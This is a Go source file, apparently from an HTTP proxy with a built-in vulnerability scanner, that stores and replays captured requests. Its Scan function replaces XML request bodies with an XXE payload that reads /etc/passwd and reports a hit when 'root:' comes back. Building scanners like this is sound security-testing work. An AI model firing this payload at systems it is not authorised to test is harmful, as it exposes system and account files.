package usecase

import (
	"bytes"
	"io"
	"net/http"
	"proxy/internal/models"
	"proxy/internal/pkg/proxy_server"
	"proxy/internal/pkg/vunerabilities_scaner"
	"strings"
)

type UseCase struct {
	repo   vunerabilities_scaner.Repository
	hProxy proxy.HandlerProxy
}

func NewRepoUsecase(repo vunerabilities_scaner.Repository, hProxy proxy.HandlerProxy) vunerabilities_scaner.UseCase {
	return &UseCase{repo: repo, hProxy: hProxy}
}

func (uc *UseCase) GetAllRequests() ([]models.Request, models.StatusCode) {
	return uc.repo.GetAllRequests()
}

func (uc *UseCase) GetRequest(id int) (models.Request, models.StatusCode) {
	return uc.repo.GetRequest(id)
}

func (uc *UseCase) RepeatRequest(id int) (models.Response, models.StatusCode) {
	request, status := uc.GetRequest(id)
	if status != models.Okey {
		return models.Response{}, models.NotFound
	}

	body := bytes.NewBufferString(request.Body)
	urlStr := request.Scheme + "://" + request.Host + request.Path
	req, err := http.NewRequest(request.Method, urlStr, body)
	if err != nil {
		return models.Response{}, models.InternalError
	}

	for key, value := range request.Header {
		req.Header.Add(key, value)
	}

	resp := uc.hProxy.Proxy(req)

	return resp, models.Okey
}

func (uc *UseCase) Scan(id int) models.StatusCode {
	request, status := uc.GetRequest(id)
	if status != models.Okey {
		return models.NotFound
	}

	if strings.Contains(request.Body, "<?xml") {
		request.Body = `<!DOCTYPE foo [
		<!ELEMENT foo ANY >
		<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<foo>&xxe;</foo>`
	}
	body := bytes.NewBufferString(request.Body)
	urlStr := request.Scheme + "://" + request.Host + request.Path
	req, err := http.NewRequest(request.Method, urlStr, body)
	if err != nil {
		return models.InternalError
	}
	for key, value := range request.Header {
		req.Header.Add(key, value)
	}
	response, _ := http.DefaultTransport.RoundTrip(req)

	if response.StatusCode == http.StatusOK {

		bodyBytes, _ := io.ReadAll(response.Body)
		bodyString := string(bodyBytes)

		if strings.Contains(bodyString, "root:") {
			return models.VunerabilityFound
		}
	}
	return models.Okey
}
